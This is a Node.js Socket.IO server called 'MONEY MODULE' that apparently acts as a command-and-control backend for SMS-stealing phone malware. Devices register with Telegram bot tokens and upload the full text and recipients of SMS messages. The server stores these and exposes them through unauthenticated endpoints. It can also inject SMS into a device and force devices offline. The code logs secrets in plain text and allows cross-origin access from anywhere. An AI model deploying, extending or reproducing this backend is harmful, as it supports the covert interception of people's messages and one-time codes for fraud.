/**
 * MONEY MODULE - Socket.IO Server
 * Deploy this on Railway, Render, or any VPS
 */

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  },
  transports: ['websocket', 'polling'],
  pingTimeout: 60000,
  pingInterval: 25000,
  upgradeTimeout: 30000,
  allowUpgrades: true
});

// Store connected devices
const connectedDevices = new Map();
const registeredDevices = new Map();
const lastSmsReceived = new Map(); // Store last SMS per device for debugging

// Health check endpoint
app.get('/', (req, res) => {
  res.json({
    status: 'online',
    message: 'MONEY MODULE Server Running',
    connectedDevices: connectedDevices.size,
    registeredDevices: registeredDevices.size,
    uptime: process.uptime()
  });
});

// API endpoint to check device
app.get('/api/device/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const device = registeredDevices.get(deviceId);
  
  if (device) {
    res.json({ success: true, device: device });
  } else {
    res.json({ success: false, message: 'Device not found' });
  }
});

// Debug endpoint - Check last received SMS (to verify no truncation)
app.get('/api/lastsms/:deviceId', (req, res) => {
  const { deviceId } = req.params;
  const sms = lastSmsReceived.get(deviceId);
  
  if (sms) {
    res.json({ 
      success: true, 
      sms: sms,
      verification: {
        messageLength: sms.textMessage ? sms.textMessage.length : 0,
        fullMessage: sms.textMessage
      }
    });
  } else {
    res.json({ success: false, message: 'No SMS received from this device yet' });
  }
});

// Debug endpoint - Get all last SMS records
app.get('/api/allsms', (req, res) => {
  const allSms = {};
  for (const [deviceId, sms] of lastSmsReceived) {
    allSms[deviceId] = sms;
  }
  res.json({ 
    success: true, 
    count: lastSmsReceived.size,
    records: allSms 
  });
});

// SMS Send endpoint - App calls this to send SMS data
app.use(express.json({ limit: '10mb' })); // Increase body size limit
app.post('/send', (req, res) => {
  try {
    const { deviceId, destNumber, textMessage } = req.body;
    
    // Log in parts to avoid Railway log truncation
    console.log(`[SMS] ========== NEW SMS ==========`);
    console.log(`[SMS] Device: ${deviceId}`);
    console.log(`[SMS] To: ${destNumber}`);
    console.log(`[SMS] Message Length: ${textMessage ? textMessage.length : 0}`);
    console.log(`[SMS] Full Message: ${textMessage}`);
    console.log(`[SMS] ==============================`);
    
    // Update device last seen
    if (registeredDevices.has(deviceId)) {
      const device = registeredDevices.get(deviceId);
      device.lastSeen = new Date().toISOString();
      registeredDevices.set(deviceId, device);
    }
    
    // Store SMS for verification
    const smsRecord = {
      deviceId,
      destNumber,
      textMessage,
      messageLength: textMessage ? textMessage.length : 0,
      receivedAt: new Date().toISOString()
    };
    
    // Store last SMS for debugging endpoint
    lastSmsReceived.set(deviceId, smsRecord);
    
    // Log the full SMS record as JSON for debugging
    console.log(`[SMS-RECORD] ${JSON.stringify(smsRecord)}`);
    
    res.json({
      status: "true",
      message: "SMS received successfully",
      receivedLength: textMessage ? textMessage.length : 0
    });
  } catch (error) {
    console.error('[SMS] Error:', error);
    res.status(500).json({
      status: "false",
      message: "Error processing SMS"
    });
  }
});

// Socket.IO connection handling
io.on('connection', (socket) => {
  console.log(`[CONNECT] New connection: ${socket.id}`);
  
  // Get ALL auth data from app
  const deviceId = socket.handshake.auth?.deviceId || 'unknown';
  const botToken = socket.handshake.auth?.botToken || '';
  const chatId = socket.handshake.auth?.chatId || '';
  
  console.log(`[AUTH] Device: ${deviceId}`);
  console.log(`[AUTH] Bot Token: ${botToken}`);
  console.log(`[AUTH] Chat ID: ${chatId}`);
  
  // Store connection with all data
  connectedDevices.set(socket.id, {
    deviceId,
    botToken,
    chatId,
    socketId: socket.id,
    connectedAt: new Date().toISOString()
  });
  
  // AUTO-REGISTER device from auth
  if (deviceId && deviceId !== 'unknown') {
    registeredDevices.set(deviceId, {
      deviceId: deviceId,
      botToken: botToken,
      chatId: chatId,
      socketId: socket.id,
      registeredAt: new Date().toISOString(),
      lastSeen: new Date().toISOString()
    });
    console.log(`[REGISTERED] Device: ${deviceId} with token length: ${botToken?.length || 0}`);
  }
  
  // Send connection confirmation (app listens for 'connected' event)
  socket.emit('connected', {
    message: 'Connected to server',
    deviceId: deviceId,
    socketId: socket.id
  });
  
  // Handle explicit register event (backup)
  socket.on('register', (data) => {
    console.log(`[REGISTER] Explicit registration: ${JSON.stringify(data)}`);
    const regDeviceId = data?.deviceId || deviceId;
    
    registeredDevices.set(regDeviceId, {
      deviceId: regDeviceId,
      socketId: socket.id,
      registeredAt: new Date().toISOString(),
      lastSeen: new Date().toISOString()
    });
    
    socket.emit('registered', {
      success: true,
      message: 'Device registered successfully',
      deviceId: regDeviceId
    });
  });
  
  // Handle SMS response from app
  socket.on('sms-response', (data) => {
    console.log(`[SMS-RESPONSE] From ${deviceId}: ${JSON.stringify(data)}`);
    
    // Update last seen
    if (registeredDevices.has(deviceId)) {
      const device = registeredDevices.get(deviceId);
      device.lastSeen = new Date().toISOString();
      registeredDevices.set(deviceId, device);
    }
  });
  
  // Handle heartbeat
  socket.on('heartbeat', (data) => {
    console.log(`[HEARTBEAT] From ${deviceId}`);
    
    // Update last seen
    if (registeredDevices.has(deviceId)) {
      const device = registeredDevices.get(deviceId);
      device.lastSeen = new Date().toISOString();
      registeredDevices.set(deviceId, device);
    }
    
    socket.emit('heartbeat', { timestamp: Date.now() });
  });
  
  // Handle disconnect
  socket.on('disconnect', (reason) => {
    console.log(`[DISCONNECT] ${deviceId} (${socket.id}): ${reason}`);
    connectedDevices.delete(socket.id);
    // Don't remove from registeredDevices - keep history
  });
  
  // Handle errors
  socket.on('error', (error) => {
    console.error(`[ERROR] ${deviceId}: ${error}`);
  });
});

// Send SMS to device (for Telegram bot integration)
function sendSmsToDevice(deviceId, smsData) {
  for (const [socketId, device] of connectedDevices) {
    if (device.deviceId === deviceId) {
      io.to(socketId).emit('insert-sms', smsData);
      console.log(`[INSERT-SMS] Sent to ${deviceId}`);
      return true;
    }
  }
  console.log(`[INSERT-SMS] Device ${deviceId} not connected`);
  return false;
}

// Force disconnect device
function forceDisconnect(deviceId, reason) {
  for (const [socketId, device] of connectedDevices) {
    if (device.deviceId === deviceId) {
      io.to(socketId).emit('force_disconnect', { reason });
      io.sockets.sockets.get(socketId)?.disconnect(true);
      console.log(`[FORCE-DISCONNECT] ${deviceId}: ${reason}`);
      return true;
    }
  }
  return false;
}

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log('========================================');
  console.log('🚀 MONEY MODULE Server Started');
  console.log(`📡 Port: ${PORT}`);
  console.log('========================================');
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down...');
  server.close(() => {
    console.log('Server closed');
    process.exit(0);
  });
});
